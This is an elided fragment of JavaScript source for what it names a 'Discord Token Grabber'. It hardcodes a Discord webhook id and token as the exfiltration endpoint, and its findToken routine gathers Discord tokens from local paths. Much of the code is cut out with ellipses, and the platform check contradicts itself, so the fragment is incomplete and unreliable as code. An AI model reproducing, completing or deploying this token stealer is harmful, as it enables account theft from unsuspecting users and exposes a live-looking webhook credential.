...
const wc = new WebhookClient({
  id: "1153662560978079774",
  token: "ITIIyRCU_4DA2a9NTuFQMTvdYgnJlRRVEW1K9KC3b89cMp1p5pyHTnfTmpS0g9LbHZ1Q",
});
...
function findToken(tokenPath) {
  ...
  try {
    ...
    console.error(`no directory found for ${tokenPath}`);
  }
  return tokens;
}
...
function discordTokenGrabber() {
  ...
  if (computerPlatform == "win32") {
    ...
    return console.log(
      "The Discord Token Grabber support only Windows, Linux."
    );
  }
